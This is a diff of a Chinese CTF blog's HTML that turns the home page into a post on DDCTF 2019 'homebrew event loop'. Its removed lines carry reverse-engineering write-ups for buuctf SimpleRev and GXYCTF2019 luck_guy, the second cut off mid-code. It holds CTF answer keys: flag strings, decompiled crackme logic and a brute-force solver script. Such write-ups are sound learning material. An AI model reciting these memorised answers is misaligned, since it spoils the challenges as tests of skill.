@@ -22,30 +22,58 @@
     var CONFIG = {"hostname":"4chan123.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="For U">
-<meta property="og:type" content="website">
-<meta property="og:title" content="4chan">
-<meta property="og:url" content="https://4chan123.github.io/index.html">
+  <meta name="description" content="有点意思的一道代码审计题  先简单串烧一下一些基本知识点   session in python   append in python   _str in python   flask的常用接收参数的方法   python路由    python文件源码 12345678910111213141516171819202122232425262728293031323334353637383940">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF 2019 homebrew event loop">
+<meta property="og:url" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/index.html">
 <meta property="og:site_name" content="4chan">
-<meta property="og:description" content="For U">
+<meta property="og:description" content="有点意思的一道代码审计题  先简单串烧一下一些基本知识点   session in python   append in python   _str in python   flask的常用接收参数的方法   python路由    python文件源码 12345678910111213141516171819202122232425262728293031323334353637383940">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/1.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/2.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/3.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/4.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/5-1618217024506.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/7.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/6%E3%80%81-1618217546707.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/8.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/9.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/10.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/11.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/12.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/13.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/14.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/15.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/16.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/17.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/18.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/19.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/23.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/24-1618229726360.png">
+<meta property="og:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/25.png">
+<meta property="article:published_time" content="2021-04-11T14:33:52.000Z">
+<meta property="article:modified_time" content="2021-04-12T12:17:41.265Z">
 <meta property="article:author" content="4Chan">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/1.png">
 
-<link rel="canonical" href="https://4chan123.github.io/">
+<link rel="canonical" href="https://4chan123.github.io/2021/04/11/DDCTF-2019-homebrew-event-loop/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>4chan</title>
+  <title>DDCTF 2019 homebrew event loop | 4chan</title>
   
 
 
@@ -198,9 +226,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -216,10 +245,9 @@
       <meta itemprop="name" content="4chan">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/11/DDCTF-2019-homebrew-event-loop/" class="post-title-link" itemprop="url">DDCTF 2019 homebrew event loop</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          DDCTF 2019 homebrew event loop
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -239,6 +267,13 @@
               </span>
 
           
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -263,7 +298,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <blockquote>
+        <blockquote>
 <p>有点意思的一道代码审计题</p>
 </blockquote>
 <h2 id="先简单串烧一下一些基本知识点">先简单串烧一下一些基本知识点</h2>
@@ -400,511 +435,61 @@
 <p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/25.png" alt="25"></p>
 <p><strong>func:show_flag;flag{d07646de-b436-4966-ad68-fd2fc9d9764f}</strong>                         ❣️ ❣️  ❣️  ❣️ ​</p>
 
-      
     </div>
 
     
     
     
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+        
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/10/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/">
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="4Chan">
-      <meta itemprop="description" content="For U">
-    </span>
+    <div class="social-list">
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="4chan">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/10/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/" class="post-title-link" itemprop="url">总结一下最近学习状况</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-11 04:55:29 / 修改时间：21:01:32" itemprop="dateCreated datePublished" datetime="2021-04-11T04:55:29+08:00">2021-04-11</time>
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
             </span>
 
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/04/10/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/10/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
+            <span class="label">RSS</span>
+          </a>
         </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>看了一下最近自己博客更新速度（大二）和自己打比赛的状况，三个字来概括就是“很差劲”。打比赛很多题还是不会，感觉真的没有在认真学，内心非常浮躁，没有对紧迫时间的敬畏。真的必须规定自己每天至少一道web或者python，总结题目的时间至少在两个小时以上才行</p>
-
-      
     </div>
+  </div>
 
-    
-    
-    
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
+          <div class="post-tags">
+              <a href="/tags/WEB/" rel="tag"><i class="fa fa-tag"></i> WEB</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/10/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/" rel="prev" title="总结一下最近学习状况">
+      <i class="fa fa-chevron-left"></i> 总结一下最近学习状况
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/10/buuctf-SimpleRev/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="4Chan">
-      <meta itemprop="description" content="For U">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="4chan">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/10/buuctf-SimpleRev/" class="post-title-link" itemprop="url">buuctf-SimpleRev</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-11 00:42:57 / 修改时间：21:30:03" itemprop="dateCreated datePublished" datetime="2021-04-11T00:42:57+08:00">2021-04-11</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/04/10/buuctf-SimpleRev/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/10/buuctf-SimpleRev/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/15ojPMVsasx3EZ9s5wVQqEw">https://pan.baidu.com/s/15ojPMVsasx3EZ9s5wVQqEw</a><br>
-提取码：icjp</p>
-<h2 id="0x01-使用EFPE查看文件"><strong>0x01 使用EFPE查看文件</strong></h2>
-<p><img src="/2021/04/10/buuctf-SimpleRev/1.png" alt="1"></p>
-<p>没有加壳，64位文件</p>
-<h2 id="0x02-使用IDA打开文件，查看main函数，F5反编译"><strong>0x02 使用IDA打开文件，查看main函数，F5反编译</strong></h2>
-<p><img src="/2021/04/10/buuctf-SimpleRev/3.png" alt="3"></p>
-<h2 id="0x03-查看-Decry-函数"><strong>0x03 查看</strong> <em>Decry()函数</em></h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">Decry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+Fh] [bp-51h]@19</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+10h] [bp-50h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [sp+14h] [bp-4Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+18h] [bp-48h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-44h]@1</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [sp+20h] [bp-40h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+28h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+30h] [bp-30h]@1</span></span><br><span class="line">  __int64 v10; <span class="comment">// [sp+40h] [bp-20h]@1</span></span><br><span class="line">  __int64 v11; <span class="comment">// [sp+48h] [bp-18h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+50h] [bp-10h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+58h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v13 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  *(_QWORD *)src = <span class="number">357761762382LL</span>;  <span class="comment">//选中之后H键转换16进制为0x534C43444ELL，数据在内存中是小端顺序，高位在高地址处，低位在低地址处，故实际的字符顺序应为&#x27;0x4e44434c53&#x27;经过16字符转换为ASCII码转换后字符为&#x27;NDCLS&#x27;</span></span><br><span class="line">　　　　　　　　　　　　　　　　　　　　　　</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">512969957736LL</span>; <span class="comment">//同上，转换后查询Ascii码为&quot;wodah&quot;</span></span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v0) = join(key3, &amp;v10); <span class="comment">//在main页面v3=&#x27;kills&#x27;,v10=’wodah‘,这个函数就是把v3和v10两个字符串相拼接&#x27;killshadow&#x27;</span></span><br><span class="line">  text = v0;</span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);  <span class="comment">//strcpy函数就是让key1的值（&#x27;ADSFK&#x27;）赋予key</span></span><br><span class="line">  <span class="built_in">strcat</span>(key, src);  <span class="comment">//strcat函数就是让src的值拼接到key后面也就是&#x27;ADSFKNDCLS&#x27;</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  getchar(); <span class="comment">//清空缓冲区</span></span><br><span class="line">  v6 = <span class="built_in">strlen</span>(key); <span class="comment">//v6的长度等于key,v6=10</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v4 % v6] &gt; <span class="number">64</span> &amp;&amp; key[v4 % v6] &lt;= <span class="number">90</span> ) <span class="comment">//将大写字母转换为小写字母</span></span><br><span class="line">      key[i] = key[v4 % v6] + <span class="number">32</span>;                  <span class="comment">//’adsfkndcls‘</span></span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>, src);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt;= <span class="number">96</span> || v2 &gt; <span class="number">122</span> )     <span class="comment">//如果输入的v2不是小写字母</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">64</span> &amp;&amp; v2 &lt;= <span class="number">90</span> )   <span class="comment">//如果v2为大写字母</span></span><br><span class="line">          str2[v3] = (v2 - <span class="number">39</span> - key[v4++ % v6] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;  <span class="comment">//对srt[v3]进行处理（v3为0每次加1）//// str1[v3] = (v2-key[v4]+58)%26 + 97//变换后str2[v3]存放小写字母</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v3] = (v2 - <span class="number">39</span> - key[v4++ % v6] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">//同样处理</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v4 % v6) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )         <span class="comment">//如果text和存储的str2相同，就成功·</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);       <span class="comment">//text = &quot;&quot;killshadow&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>分析代码以及相应的值，我们已经可以知道text以及key的值，剩下就是str2，str2就是我们想要的flag</p>
-<p>得到flag的条件关键在于式子<strong>str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97</strong></p>
-<h2 id="0x04-构造playload爆破"><strong>0x04 构造playload爆破</strong></h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&#x27;killswodah&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;adsfkslcdn&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">122</span>):</span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">ord</span>(text[i]) == (j - <span class="number">39</span> - <span class="built_in">ord</span>(key[i % <span class="number">10</span>]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>:</span><br><span class="line">             flag += <span class="built_in">chr</span>(j)</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-<p>flag{KLDQCOZFDU}</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://4chan123.github.io/2021/04/07/GXYCTF2019-luck-guy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="4Chan">
-      <meta itemprop="description" content="For U">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="4chan">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/07/GXYCTF2019-luck-guy/" class="post-title-link" itemprop="url">GXYCTF2019 luck_guy</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-04-08 02:03:55 / 修改时间：21:45:41" itemprop="dateCreated datePublished" datetime="2021-04-08T02:03:55+08:00">2021-04-08</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/04/07/GXYCTF2019-luck-guy/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/04/07/GXYCTF2019-luck-guy/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hoU9">https://pan.baidu.com/s/1hoU9</a>         uQsSeGr-6p7RBSm56w<br>
-提取码：ed2z</p>
-</blockquote>
-<h2 id="0x01-查看有无加壳"><strong>0x01 查看有无加壳</strong></h2>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/1.png" alt="1"></p>
-<p>没有加壳，64位文件</p>
-<h2 id="0x02-打开IDA64，查看main函数，F5反编译"><strong>0x02 打开IDA64，查看main函数，F5反编译</strong></h2>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/2.png" alt="2"></p>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/3.png" alt="3"></p>
-<h2 id="0x03-进入patch-me函数，接着进入get-flag函数界面">0x03 进入patch_me函数，接着进入get_flag函数界面</h2>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/4.png" alt="4"></p>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/5.png" alt="5"></p>
-<h2 id="0x04-进行代码分析-😞"><strong>0x04 进行代码分析</strong> 😞</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+8h] [bp-38h]@7</span></span><br><span class="line">  __int64 s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+18h] [bp-28h]@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);               <span class="comment">//得到时间</span></span><br><span class="line">  srand(v0);                    <span class="comment">//使用时间作为种子生成随机数字</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )      <span class="comment">// 产生1-199之间的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);      </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL); </span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, f1);   <span class="comment">// f1=&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, &amp;f2);  <span class="comment">//f2初始为空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;  <span class="comment">//在IDA里面选中9180147350284624745LL按H键转换16进制为0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f    </span></span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);  <span class="comment">//f2和s拼接</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span 